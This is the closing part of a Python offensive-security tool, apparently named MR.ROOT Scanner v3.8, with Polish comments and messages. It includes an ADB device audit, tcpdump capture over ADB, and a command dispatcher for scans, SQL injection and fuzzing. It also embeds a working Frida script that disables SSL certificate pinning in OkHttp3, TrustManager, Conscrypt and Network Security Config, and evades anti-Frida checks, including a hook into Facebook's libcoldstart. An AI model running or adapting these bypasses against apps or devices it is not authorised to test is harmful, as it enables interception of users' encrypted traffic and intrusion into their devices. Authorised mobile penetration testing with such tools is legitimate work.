            "finding": f"ADB TCP aktywne na porcie {tcp_port} — urządzenie dostępne przez sieć WiFi!"
        })

    if info.get("selinux", "").lower() == "permissive":
        findings.append({
            "severity": "HIGH",
            "finding": "SELinux=Permissive — polityki SELinux wyłączone! Brak izolacji procesów."
        })

    if info.get("root_shell") == "TAK ✅":
        findings.append({
            "severity": "INFO",
            "finding": "Root shell dostępny przez 'su'. (Oczekiwane na urządzeniu testowym.)"
        })

    return findings


def _adb_frida_inject(serial, package):
    """
    [v3.8] Push frida-server na urządzenie przez ADB USB, uruchomienie
    i wykonanie universal SSL unpin na wskazanej aplikacji.

    Wymaga:
      - frida-server ARM64 w FRIDA_SERVER_LOCAL
        Pobierz: https://github.com/frida/frida/releases (frida-server-*-android-arm64.xz)
      - pip install frida-tools --break-system-packages
    """
    log("scan", f"Frida SSL Unpin → {c(C.WHITE+C.BOLD, package)}")

    if not os.path.exists(FRIDA_SERVER_LOCAL):
        log("err", f"Brak frida-server: {FRIDA_SERVER_LOCAL}")
        log("info", "Pobierz frida-server-*-android-arm64.xz z github.com/frida/frida/releases")
        log("info", f"Rozpakuj: xz -d frida-server-*.xz && mv frida-server-* {FRIDA_SERVER_LOCAL}")
        return {"success": False, "error": "frida_server_missing"}

    if shutil.which("frida") is None:
        log("err", "Narzędzie 'frida' nie jest w PATH.")
        log("info", "Zainstaluj: pip install frida-tools --break-system-packages")
        return {"success": False, "error": "frida_tools_missing"}

    result = {"success": False, "package": package}

    log("info", f"[1/4] Push frida-server → {FRIDA_SERVER_REMOTE}")
    _, rc = _adb(serial, "push", FRIDA_SERVER_LOCAL, FRIDA_SERVER_REMOTE, timeout=30)
    if rc != 0:
        log("err", "Push frida-server FAILED.")
        return {**result, "error": "push_failed"}

    log("info", "[2/4] chmod +x frida-server")
    _adb(serial, "shell", "su", "-c", f"chmod +x {FRIDA_SERVER_REMOTE}")

    log("info", "[3/4] Uruchamianie frida-server na urządzeniu...")
    _adb(serial, "shell", "su", "-c", "pkill -9 frida-server 2>/dev/null; sleep 1.5")
    subprocess.Popen(
        ["adb"] + (["-s", serial] if serial else []) +
        ["shell", "su", "-c", f"{FRIDA_SERVER_REMOTE} &"],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    time.sleep(2)

    ps_out, _ = _adb(serial, "shell", "su", "-c", "ps -A | grep frida")
    if "frida" in ps_out.lower():
        log("ok", "frida-server uruchomiony!")
    else:
        log("warn", "frida-server może nie być aktywny (sprawdź: adb shell su -c ps -A | grep frida).")

    am_out, _ = _adb(serial, "shell", "pidof", package)
    if not am_out.strip():
        log("info", f"Uruchamianie {package}...")
        _adb(serial, "shell", "monkey", "-p", package,
             "-c", "android.intent.category.LAUNCHER", "1", timeout=10)
        time.sleep(3)

    ssl_unpin_script = r"""
// ── Anti-Frida bypass (Facebook libcoldstart) ──
try {
    var libcoldstart = Process.getModuleByName("libcoldstart.so");
    Interceptor.attach(libcoldstart.base.add(0x8090), {
        onEnter: function() {},
        onLeave: function(ret) { ret.replace(ptr(0)); }
    });
} catch(e) {}

// ── Frida detection bypass ──
try {
    var openFunc = Module.getExportByName(null, "open");
    Interceptor.attach(openFunc, {
        onEnter: function(args) {
            var path = args[0].readUtf8String();
            if (path && path.indexOf("frida") !== -1) {
                args[0].writeUtf8String("/dev/null");
            }
        }
    });
} catch(e) {}

Java.perform(function() {
    // ── OkHttp3 CertificatePinner ──
    try {
        var CertPinner = Java.use("okhttp3.CertificatePinner");
        CertPinner.check.overload("java.lang.String","java.util.List").implementation = function(h,c) {
            console.log("[MR.ROOT] OkHttp3 pin bypassed: " + h);
        };
        CertPinner.check.overload("java.lang.String","[Ljava.lang.String;").implementation = function(h,c) {
            console.log("[MR.ROOT] OkHttp3 pin bypassed (v2): " + h);
        };
    } catch(e) {}

    // ── TrustManager (javax.net.ssl) ──
    try {
        var X509TrustManager = Java.use("javax.net.ssl.X509TrustManager");
        var SSLContext = Java.use("javax.net.ssl.SSLContext");
        var TrustManager = Java.registerClass({
            name: "com.mrroot.TrustAll",
            implements: [X509TrustManager],
            methods: {
                checkClientTrusted: function() {},
                checkServerTrusted: function() {
                    console.log("[MR.ROOT] TrustManager: checkServerTrusted bypassed");
                },
                getAcceptedIssuers: function() { return []; }
            }
        });
        SSLContext.init.overload(
            "[Ljavax.net.ssl.KeyManager;",
            "[Ljavax.net.ssl.TrustManager;",
            "java.security.SecureRandom"
        ).implementation = function(km, tm, sr) {
            this.init(km, [TrustManager.$new()], sr);
        };
    } catch(e) {}

    // ── Conscrypt / WebView (Android 7+) ──
    try {
        var NetworkSecurityTrustManager = Java.use(
            "com.android.org.conscrypt.TrustManagerImpl"
        );
        NetworkSecurityTrustManager.verifyChain.implementation = function(
            untrustedChain, trustAnchorChain, host, clientAuth, ocspData, tlsSctData
        ) {
            console.log("[MR.ROOT] Conscrypt pin bypassed: " + host);
            return untrustedChain;
        };
    } catch(e) {}

    // ── Network Security Config (Android 7+ NSC) ──
    try {
        var PinningTrustManager = Java.use(
            "android.security.net.config.NetworkSecurityTrustManager"
        );
        PinningTrustManager.checkPins.overload(
            "java.util.List"
        ).implementation = function(c) {
            console.log("[MR.ROOT] NSC pin bypassed");
        };
    } catch(e) {}

    console.log("[MR.ROOT Frida v3.8] SSL Unpinning załadowany! Przechwytuj ruch przez Burp/mitmproxy.");
});
"""

    import tempfile
    with tempfile.NamedTemporaryFile(
        mode="w", suffix=".js", prefix="mrroot_unpin_",
        dir=BASE_DIR, delete=False, encoding="utf-8"
    ) as tmp:
        tmp.write(ssl_unpin_script)
        script_path = tmp.name

    log("info", f"[4/4] Podpinanie Frida do {package}...")
    log("warn", "Ctrl+C aby zatrzymać i wrócić do MR.ROOT>>\n")

    try:
        # --no-pause usunięte w Frida 16+ (domyślne zachowanie)
        frida_cmd = ["frida", "-U", "-f", package, "-l", script_path]
        if serial:
            frida_cmd = ["frida", "--device", serial, "-f", package, "-l", script_path]
        proc = subprocess.Popen(frida_cmd)
        proc.wait()
        result["success"] = True
    except KeyboardInterrupt:
        log("warn", "Frida zatrzymany przez użytkownika.")
        result["success"] = True
    except Exception as e:
        log("err", f"Frida error: {e}")
        result["error"] = str(e)
    finally:
        try:
            os.remove(script_path)
        except OSError:
            pass

    _adb(serial, "shell", "su", "-c", "pkill frida-server 2>/dev/null")
    log("ok", "frida-server zatrzymany.")
    return result


def _adb_traffic_dump(serial, duration=TRAFFIC_DUMP_DURATION):
    """
    [v3.8] Push statycznego tcpdump ARM64 przez ADB, przechwytuje ruch
    przez <duration> sekund, ściąga .pcap na hosta do REPORT_DIR.

    Wymaga statycznego tcpdump ARM64:
      https://github.com/extremecoders-re/tcpdump-android-builds
    """
    log("scan", f"Traffic Dump — tcpdump przez ADB USB ({duration}s)")

    if not os.path.exists(TCPDUMP_LOCAL):
        log("err", f"Brak tcpdump: {TCPDUMP_LOCAL}")
        log("info", "Pobierz statyczny ARM64 tcpdump:")
        log("info", "  https://github.com/extremecoders-re/tcpdump-android-builds")
        log("info", f"  Umieść jako: {TCPDUMP_LOCAL}")
        return {"success": False, "error": "tcpdump_missing"}

    ts          = now()
    remote_pcap = f"/data/local/tmp/capture_{ts}.pcap"
    safe_serial = (serial or "device").replace(":", "_")
    local_pcap  = f"{REPORT_DIR}/traffic_{safe_serial}_{ts}.pcap"

    log("info", f"[1/3] Push tcpdump → {TCPDUMP_REMOTE}")
    _, rc = _adb(serial, "push", TCPDUMP_LOCAL, TCPDUMP_REMOTE, timeout=30)
    if rc != 0:
        log("err", "Push tcpdump FAILED — sprawdź uprawnienia lub stan ADB.")
        return {"success": False, "error": "push_failed"}
    _adb(serial, "shell", "su", "-c", f"chmod +x {TCPDUMP_REMOTE}")

    log("info", f"[2/3] Przechwytywanie ruchu ({duration}s)...")
    log("warn", "Ctrl+C aby zatrzymać wcześniej.\n")

    try:
        cmd = (
            ["adb"] + (["-s", serial] if serial else []) +
            ["shell", "su", "-c",
             f"{TCPDUMP_REMOTE} -i any -w {remote_pcap} -G {duration} -W 1"]
        )
        subprocess.run(cmd, timeout=duration + 5)
    except (subprocess.TimeoutExpired, KeyboardInterrupt):
        pass

    # Skopiuj pcap do /sdcard/ — adb pull nie ma su, nie może czytać /data/local/tmp/
    sdcard_pcap = f"/sdcard/mrroot_capture_{ts}.pcap"
    log("info", f"[3/3] Pull {remote_pcap} → {local_pcap}")
    _adb(serial, "shell", "su", "-c",
         f"cp {remote_pcap} {sdcard_pcap} && chmod 644 {sdcard_pcap}")
    _, rc = _adb(serial, "pull", sdcard_pcap, local_pcap, timeout=30)

    if rc == 0 and os.path.exists(local_pcap):
        size_kb = os.path.getsize(local_pcap) // 1024
        log("ok", f"Pcap zapisany: {local_pcap} ({size_kb} KB)")
        _adb(serial, "shell", "su", "-c", f"rm -f {remote_pcap} {sdcard_pcap}")
        log("info", f"Otwórz w Wireshark: wireshark \"{local_pcap}\"")
        return {"success": True, "pcap": local_pcap, "size_kb": size_kb}
    else:
        log("err", "Nie udało się ściągnąć pcap — sprawdź uprawnienia su na urządzeniu.")
        _adb(serial, "shell", "su", "-c", f"rm -f {remote_pcap} {sdcard_pcap}")
        return {"success": False, "error": "pull_failed"}


def adb_audit(target_package=None, frida_only=False, dump_only=False,
              dump_duration=TRAFFIC_DUMP_DURATION):
    """
    [v3.8] Główna funkcja ADB Pentest Audit.

    Komendy:
      adb                  — pełny audit (Device Info + Debug Surface + APK Enum)
      adb <package>        — j.w. + od razu Frida SSL Unpin
      adb-frida <package>  — tylko Frida SSL Unpin
      adb-dump [sec]       — tylko Traffic Dump tcpdump
    """
    log("scan", "ADB Pentest Audit — MR.ROOT v3.8")

    if not _adb_check_available():
        log("err", "ADB nie jest w PATH.")
        log("info", "Zainstaluj: apt install adb  (Kali/NetHunter)")
        log("info", "            pkg install android-tools  (Termux)")
        return

    devices = _adb_get_devices()
    if not devices:
        log("err", "Brak urządzeń ADB.")
        log("info", "Podłącz Samsung przez USB i włącz: Opcje programisty → Debugowanie USB")
        log("info", "Odblokuj ekran i zaakceptuj prompt RSA na urządzeniu.")
        return

    div = c(C.CYAN+C.BOLD, "═" * 60)
    print(f"\n{div}")
    print(c(C.CYAN+C.BOLD, "  📱 ADB PENTEST AUDIT — MR.ROOT v3.8"))
    print(div)

    log("info", f"Podłączone urządzenia ADB: {len(devices)}")
    for d in devices:
        sc = C.GREEN if d["state"] == "device" else C.RED+C.BOLD
        print(f"  {c(C.WHITE+C.BOLD, d['serial']):<32} {c(sc, d['state'])}")

    ready  = [d for d in devices if d["state"] == "device"]
    unauth = [d for d in devices if d["state"] == "unauthorized"]
    for d in unauth:
        log("warn", f"UNAUTHORIZED: {d['serial']} — odblokuj ekran i zaakceptuj prompt RSA!")

    if not ready:
        log("err", "Brak autoryzowanych urządzeń.")
        return

    serial = ready[0]["serial"]
    if len(ready) > 1:
        log("warn", f"Więcej niż jedno urządzenie — używam: {serial}")
        log("info", "Podaj serial ręcznie: adb-s <serial> lub odłącz pozostałe.")

    print()

    # Tryb skrócony
    if frida_only and target_package:
        _adb_frida_inject(serial, target_package)
        return
    if dump_only:
        _adb_traffic_dump(serial, dump_duration)
        return

    report = {
        "serial":        serial,
        "timestamp":     now(),
        "scanner":       "MR.ROOT v3.8 ADB-PENTEST",
        "device_info":   {},
        "debug_surface": [],
        "apk_enum":      {},
        "frida":         None,
        "traffic_dump":  None,
    }

    # ── FAZA 1: Device Info ──────────────────────────
    print(c(C.BLUE+C.BOLD, "\n  [1/3] Device Info"))
    log("info", "Pobieranie właściwości systemu przez getprop...")
    info = _adb_device_info(serial)
    report["device_info"] = info

    card_div = c(C.CYAN+C.BOLD, "─" * 58)
    print(f"\n{card_div}")
    print(c(C.CYAN+C.BOLD, f"  KARTA URZĄDZENIA: {serial}"))
    print(card_div)

    _FIELDS = [
        ("brand",          "Brand",         C.WHITE),
        ("manufacturer",   "Manufacturer",  C.WHITE),
        ("model",          "Model",         C.GREEN+C.BOLD),
        ("device",         "Codename",      C.CYAN),
        ("android_version","Android",       C.GREEN+C.BOLD),
        ("sdk",            "SDK",           C.WHITE),
        ("abi",            "ABI",           C.WHITE),
        ("kernel",         "Kernel",        C.DIM),
        ("build_type",     "Build Type",    C.RED+C.BOLD if info.get("build_type") not in ("user","?") else C.GREEN),
        ("build_tags",     "Build Tags",    C.RED+C.BOLD if "release-keys" not in info.get("build_tags","?") else C.GREEN),
        ("verified_boot",  "Verified Boot", C.GREEN if info.get("verified_boot")=="green" else C.RED+C.BOLD),
        ("selinux",        "SELinux",       C.GREEN if info.get("selinux","").lower()=="enforcing" else C.RED+C.BOLD),
        ("debuggable",     "Debuggable",    C.RED+C.BOLD if info.get("debuggable")=="1" else C.GREEN),
        ("secure",         "ro.secure",     C.GREEN if info.get("secure")=="1" else C.RED+C.BOLD),
        ("usb_config",     "USB Config",    C.YELLOW),
        ("adb_tcp_port",   "ADB TCP Port",  C.RED+C.BOLD if info.get("adb_tcp_port","") not in ("?","-1","") else C.DIM),
        ("shell_user",     "Shell User",    C.WHITE),
        ("root_shell",     "Root (su)",     C.GREEN if "TAK" in info.get("root_shell","") else C.RED),
        ("fingerprint",    "Fingerprint",   C.DIM),
    ]
    for key, label, color in _FIELDS:
        val = info.get(key, "?")
        if val and val != "?":
            print(f"  {c(C.DIM, f'{label:<16}:')} {c(color, val[:80])}")
    print(card_div)

    # ── FAZA 2: Debug Surface ────────────────────────
    print(c(C.BLUE+C.BOLD, "\n  [2/3] Debug Surface Analysis"))
    findings = _adb_debug_surface(serial, info)
    report["debug_surface"] = findings

    sev_color = {"HIGH": C.RED+C.BOLD, "MED": C.YELLOW, "INFO": C.CYAN}
    if findings:
        print()
        for f in findings:
            col = sev_color.get(f["severity"], C.WHITE)
            level = "vuln" if f["severity"] == "HIGH" else "warn" if f["severity"] == "MED" else "info"
            log(level, f"  [{c(col, f['severity'])}] {f['finding']}")
        high_count = sum(1 for f in findings if f["severity"] == "HIGH")
        med_count  = sum(1 for f in findings if f["severity"] == "MED")
        print()
        log("ok", f"Findings: {c(C.RED+C.BOLD, str(high_count))} HIGH  "
                  f"{c(C.YELLOW, str(med_count))} MED  "
                  f"{c(C.DIM, str(len(findings)-high_count-med_count))} INFO")
    else:
        log("ok", "Brak krytycznych findings w konfiguracji systemu.")

    # ── FAZA 3: APK Enumeration ──────────────────────
    print(c(C.BLUE+C.BOLD, "\n  [3/3] APK Enumeration"))
    log("info", "Listowanie zainstalowanych aplikacji (może chwilę zająć)...")
    apks = _adb_apk_enum(serial)
    report["apk_enum"] = apks

    u_count = len(apks["user_apps"])
    s_count = len(apks["system_apps"])
    i_count = len(apks["interesting"])
    log("ok", f"User apps: {c(C.WHITE+C.BOLD, str(u_count))}  |  "
              f"System apps: {c(C.DIM, str(s_count))}  |  "
              f"Interesujące: {c(C.YELLOW+C.BOLD, str(i_count))}")

    if apks["interesting"]:
        print()
        print(c(C.YELLOW+C.BOLD, "  🎯 Interesujące aplikacje (potencjalne cele):"))
        for pkg in apks["interesting"]:
            print(f"    {c(C.YELLOW, '→')} {c(C.WHITE, pkg)}")

    if apks["user_apps"]:
        print()
        print(c(C.DIM, f"  User apps (pierwsze 30 z {u_count}):"))
        for app in apks["user_apps"][:30]:
            print(c(C.DIM, f"    {app['package']}"))
        if u_count > 30:
            print(c(C.DIM, f"    ... i {u_count - 30} więcej w raporcie JSON"))

    # ── Frida / Dump (opcjonalne) ────────────────────
    print(c(C.BLUE+C.BOLD, "\n  Opcje dalsze:"))
    if target_package:
        frida_result = _adb_frida_inject(serial, target_package)
        report["frida"] = frida_result
    else:
        print(c(C.DIM, f"    {c(C.GREEN, 'adb-frida <package>')}  — Frida SSL Unpin na wybranej apce"))
        print(c(C.DIM, f"    {c(C.GREEN, 'adb-dump [sec]')}       — tcpdump capture ({TRAFFIC_DUMP_DURATION}s domyślnie)"))

    # ── Raport JSON ──────────────────────────────────
    ts = now()
    out_file = f"{REPORT_DIR}/adb_audit_{serial.replace(':','_')}_{ts}.json"
    try:
        with open(out_file, "w", encoding="utf-8") as f:
            json.dump(report, f, indent=2, ensure_ascii=False, default=str)
        print()
        log("ok", f"Raport ADB Audit: {out_file}")
    except Exception as e:
        log("err", f"Błąd zapisu raportu: {e}")

    print(f"\n{div}\n")
    return report

# =========================
# COMMAND PARSER
# =========================
def parse_interactive_command(raw):
    raw, lower = raw.strip(), raw.strip().lower()
    if lower in ["q", "exit", "quit"]:
        return "quit", None, None
    if lower in ["h", "help", "?"]:
        return "help", None, None
    if lower == "sweep":
        return "sweep", None, None
    if lower.startswith("sweep "):
        return "sweep", raw[6:].strip(), None

    if lower == "all-net":
        return "all-net", None, None
    if lower.startswith("all-net "):
        parts = raw[8:].strip().split(None, 1)
        cidr  = parts[0]
        wl    = parts[1] if len(parts) > 1 else None
        return "all-net", cidr, wl

    if lower.startswith("f "):
        parts = raw[2:].strip().split(None, 1)
        ip_arg = parts[0]
        wl_arg = parts[1] if len(parts) > 1 else None
        if validate_ip(ip_arg):
            return "fuzz", ip_arg, wl_arg
        return "unknown", f"Nieprawidłowy IP: {ip_arg}", None

    if lower.startswith("mf "):
        parts = raw[3:].strip().split(None, 1)
        ip_arg = parts[0]
        if validate_ip(ip_arg):
            return "mfuzz", ip_arg, None
        return "unknown", f"Nieprawidłowy IP: {ip_arg}", None

    # [v3.5] sql <URL>
    if lower.startswith("sql "):
        url_arg = raw[4:].strip()
        if url_arg.startswith(("http://", "https://")):
            return "sql", url_arg, None
        return "unknown", f"Nieprawidłowy URL (wymagane http:// lub https://): {url_arg}", None

    # [v3.5] auto-sql <URL>
    if lower.startswith("auto-sql "):
        url_arg = raw[9:].strip()
        if url_arg.startswith(("http://", "https://")):
            return "auto-sql", url_arg, None
        return "unknown", f"Nieprawidłowy URL (wymagane http:// lub https://): {url_arg}", None

    # [v3.6] hw <URL> — Headless browser scan (Playwright)
    if lower.startswith("hw "):
        url_arg = raw[3:].strip()
        if url_arg.startswith(("http://", "https://")):
            return "hw", url_arg, None
        return "unknown", f"Nieprawidłowy URL (wymagane http:// lub https://): {url_arg}", None

    # [v3.6] hpp <URL> — HTTP Parameter Pollution test
    if lower.startswith("hpp "):
        url_arg = raw[4:].strip()
        if url_arg.startswith(("http://", "https://")):
            return "hpp", url_arg, None
        return "unknown", f"Nieprawidłowy URL (wymagane http:// lub https://): {url_arg}", None

    # [v3.8] adb-frida <package>
    if lower.startswith("adb-frida "):
        pkg = raw[10:].strip()
        if pkg:
            return "adb-frida", pkg, None
        return "unknown", "Podaj package: adb-frida com.example.app", None

    # [v3.8] adb-dump [duration]
    if lower.startswith("adb-dump"):
        dur_str = raw[8:].strip()
        dur = int(dur_str) if dur_str.isdigit() else TRAFFIC_DUMP_DURATION
        return "adb-dump", dur, None

    # [v3.8] adb [package]
    if lower.startswith("adb"):
        pkg = raw[3:].strip() or None
        return "adb", pkg, None

    for prefix, cmd_type in [
        ("i ",    "identity"),
        ("snmp ", "snmp"),
        ("v ",    "vuln"),
        ("b ",    "banner"),
        ("m ",    "mobile"),
    ]:
        if lower.startswith(prefix):
            arg = raw[len(prefix):].strip()
            if validate_ip(arg):
                return cmd_type, arg, None
            return "unknown", f"Nieprawidłowy IP: {arg}", None

    if lower.startswith("all "):
        parts = raw[4:].strip().split(None, 1)
        ip_arg = parts[0]
        wl_arg = parts[1] if len(parts) > 1 else None
        if validate_ip(ip_arg):
            return "all", ip_arg, wl_arg
        return "unknown", f"Nieprawidłowy IP: {ip_arg}", None

    targets = parse_targets(raw)
    if targets:
        return "deep", targets, None
    return "unknown", "Nieprawidłowy input — wpisz h po pomoc", None


# =========================
# MAIN
# =========================
def main():
    global STRICT_SSL, FULL_PORTS, SQL_RESUME

    parser = argparse.ArgumentParser(description="MR.ROOT Scanner v3.8 REDHUNT-16-BETA | ADB-PENTEST")
    parser.add_argument("-t", "--target",
        help="Cel skanowania (IP, IPv6, CIDR lub URL dla trybu sql)")
    parser.add_argument("-m", "--mode",
        choices=["deep", "identity", "snmp", "vuln", "banner", "fuzz",
                 "sweep", "mobile", "all", "all-net", "sql", "auto-sql",
                 "hw", "hpp", "adb", "adb-frida", "adb-dump"],
        help="Tryb skanowania")
    parser.add_argument("-w", "--wordlist",
        help="Zewnętrzny plik słownika dla fuzzera")
    parser.add_argument("--strict-ssl", action="store_true",
        help="Włącz weryfikację certyfikatów SSL (domyślnie: unverified / pentest mode)")
    parser.add_argument("--full-ports", action="store_true",
        help="Vuln-scan: skanuj wszystkie 65535 portów zamiast top-1000")
    parser.add_argument("--resume", action="store_true",
        help="SQLMap: wznów poprzednią sesję (--no-flush-session) zamiast zaczynać od nowa")
    args = parser.parse_args()

    STRICT_SSL = args.strict_ssl
    FULL_PORTS = args.full_ports
    SQL_RESUME = args.resume

    print(BANNER)

    if os.geteuid() != 0:
        log("warn", f"{c(C.YELLOW+C.BOLD, 'Nie jesteś root!')} Niektóre skany (OS detection, UDP, -sU, -O) wymagają sudo.")
        log("warn", "Uruchom: sudo python3 recon3-6.py — dla pełnej funkcjonalności.")
    else:
        log("ok", f"Uprawnienia: {c(C.GREEN+C.BOLD, 'root')} — wszystkie skany dostępne.")

    if not STRICT_SSL:
        log("warn", f"{c(C.YELLOW, 'SSL:')} tryb unverified (pentest). Dodaj {c(C.WHITE, '--strict-ssl')} dla weryfikacji certyfikatów.")

    log("ok", f"Katalog raportów: {c(C.DIM, REPORT_DIR)}")
    check_captive_portal()

    # Tryb CLI (one-shot)
    if args.target and args.mode:
        log("info", f"Uruchamianie z linii komend: Tryb={args.mode}, Cel={args.target}")
        if   args.mode == "sweep":    ping_sweep(args.target)
        elif args.mode == "deep":     run_scan(parse_targets(args.target))
        elif args.mode == "identity": identity_scan(args.target)
        elif args.mode == "snmp":     snmp_scan(args.target)
        elif args.mode == "vuln":     vuln_scan(args.target)
        elif args.mode == "banner":   banner_grabber(args.target)
        elif args.mode == "fuzz":     fuzz_scan(args.target, args.wordlist)
        elif args.mode == "mobile":   mobile_scan(args.target)
        elif args.mode == "all":      full_scan(args.target, args.wordlist)
        elif args.mode == "all-net":  full_scan_network(args.target, args.wordlist)
        elif args.mode == "sql":      sql_scan(args.target)
        elif args.mode == "auto-sql": spider_and_sql(args.target)
        elif args.mode == "hw":       headless_scan(args.target)
        elif args.mode == "hpp":      hpp_test(args.target)
        elif args.mode == "adb":      adb_audit(args.target)
        elif args.mode == "adb-frida": adb_audit(target_package=args.target, frida_only=True)
        elif args.mode == "adb-dump":  adb_audit(dump_only=True)
        sys.exit(0)

    # Tryb interaktywny
    iface, my_ip, net, my_ip6 = detect_interface()
    if iface:
        ip6_info = f" | IPv6: {c(C.GREEN, my_ip6)}" if my_ip6 else ""
        log("info", f"Interfejs: {c(C.GREEN, iface)} | IP: {c(C.GREEN, my_ip)} | Sieć: {c(C.GREEN, net)}{ip6_info}")
        try:
            ans = input(c(C.YELLOW, f"\n[?] Wykonać ping sweep {net}? [T/n]: ")).strip().lower()
            if ans in ["", "t", "y", "tak", "yes"]:
                ping_sweep(net)
        except (KeyboardInterrupt, EOFError):
            pass
    else:
        log("warn", "Nie wykryto aktywnego interfejsu sieciowego")

    print(HELP_TEXT)

    while True:
        try:
            raw = input(c(C.GREEN+C.BOLD, "[MR.ROOT]>> ")).strip()
        except (KeyboardInterrupt, EOFError):
            print("\n")
            log("info", "Zamykanie...")
            save_cache(CACHE)
            sys.exit(0)

        if not raw:
            continue

        cmd_type, arg, extra = parse_interactive_command(raw)

        if   cmd_type == "quit":     save_cache(CACHE); log("info", "Żegnaj."); sys.exit(0)
        elif cmd_type == "help":     print(HELP_TEXT)
        elif cmd_type == "sweep":    ping_sweep(arg)
        elif cmd_type == "deep":     run_scan(arg)
        elif cmd_type == "identity": identity_scan(arg)
        elif cmd_type == "snmp":     snmp_scan(arg)
        elif cmd_type == "vuln":     vuln_scan(arg)
        elif cmd_type == "banner":   banner_grabber(arg)
        elif cmd_type == "fuzz":     fuzz_scan(arg, extra)
        elif cmd_type == "mfuzz":
            import tempfile
            _MOBILE_FUZZ_PATHS = [
                "/sdcard/", "/DCIM/", "/DCIM/Camera/", "/Pictures/",
                "/Download/", "/Downloads/", "/WhatsApp/", "/WhatsApp/Media/",
                "/storage/emulated/0/", "/Videos/", "/Music/", "/Android/data/"
            ]
            # [v3.7] NamedTemporaryFile — bezpieczne przy równoległych uruchomieniach
            with tempfile.NamedTemporaryFile(
                mode="w", suffix=".txt", prefix="mrroot_mfuzz_",
                dir=BASE_DIR, delete=False, encoding="utf-8"
            ) as tmp:
                tmp.write("\n".join(_MOBILE_FUZZ_PATHS))
                tmp_wl = tmp.name
            try:
                fuzz_scan(arg, tmp_wl)
            finally:
                try:
                    os.remove(tmp_wl)
                except OSError:
                    pass
        elif cmd_type == "mobile":   mobile_scan(arg)
        elif cmd_type == "all":      full_scan(arg, extra)
        elif cmd_type == "all-net":  full_scan_network(arg, extra)
        elif cmd_type == "sql":      sql_scan(arg)
        elif cmd_type == "auto-sql": spider_and_sql(arg)
        elif cmd_type == "hw":       headless_scan(arg)
        elif cmd_type == "hpp":      hpp_test(arg)
        elif cmd_type == "adb":      adb_audit(target_package=arg)
        elif cmd_type == "adb-frida": adb_audit(target_package=arg, frida_only=True)
        elif cmd_type == "adb-dump":
            dur = arg if isinstance(arg, int) else TRAFFIC_DUMP_DURATION
            adb_audit(dump_only=True, dump_duration=dur)
        elif cmd_type == "unknown":  log("err", arg)


if __name__ == "__main__":
    main()
